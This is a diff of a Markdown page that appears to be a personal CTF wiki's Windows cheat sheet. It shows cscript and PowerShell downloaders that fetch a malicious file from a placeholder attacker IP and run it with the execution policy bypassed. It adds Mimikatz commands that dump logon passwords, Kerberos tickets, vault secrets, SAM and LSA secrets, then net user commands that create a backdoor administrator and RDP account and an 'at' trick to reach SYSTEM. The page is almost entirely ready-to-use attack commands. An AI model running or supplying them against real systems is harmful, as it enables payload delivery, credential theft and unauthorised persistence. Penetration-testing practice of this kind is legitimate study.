@@ -1,14 +1,15 @@
 ---
 layout: article
-title: Windows File Transfer
-permalink: /wikis/ctf/windows-file-transfer
+title: Windows
+permalink: /wikis/ctf/windows
 aside:
     toc: true
 sidebar:
-    nav: ctf
+    nav: wikis
 ---
 
-## cscript
+## File Transfer
+### cscript
 If command execution is available and firewalls allow for file transfers: 
 
 cscript.exe is a command-line version of the Windows Script Host that provides command-line options for setting script properties. With cscript.exe, you can run scripts by typing the name of a script file at the command prompt. 
@@ -24,9 +25,7 @@ cscript <script-name> http://<attacker-ip>/<malicious-file> <output-file>
 ```
 
 
-
-
-## Powershell
+### Powershell
 Powershell transfer - red needs to be your own values 
 ```
 echo $storageDir = $pwd> wget.ps1 && echo $webclient = New-Object System.Net.WebClient>> wget.ps1 && echo $url = "http://<attacker-ip>/<malicious-file>">> wget.ps1 
@@ -44,4 +43,42 @@ type wget.ps1
 Execute PS script 
 ```
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <scriptname> 
+```
+
+
+## Mimikatz
+
+Extracting information from <b>mimikatz</b> 
+
+```
+log 
+privilege::debug 
+sekurlsa::logonpasswords 
+sekurlsa::tickets /export 
+
+vault::cred 
+vault::list 
+
+token::elevate 
+vault::cred 
+vault::list 
+lsadump::sam 
+lsadump::secrets 
+lsadump::cache
+```
+
+
+## Privilege Escalation
+
+Adding users 
+```
+net user <username> <password> /ADD 
+net localgroup administrators <username> /ADD 
+net localgroup "Remote Desktop Users" username /ADD 
+```
+<br>
+<br>
+Admin to System 
+```
+at 13:01 /interactive cmd
 ```
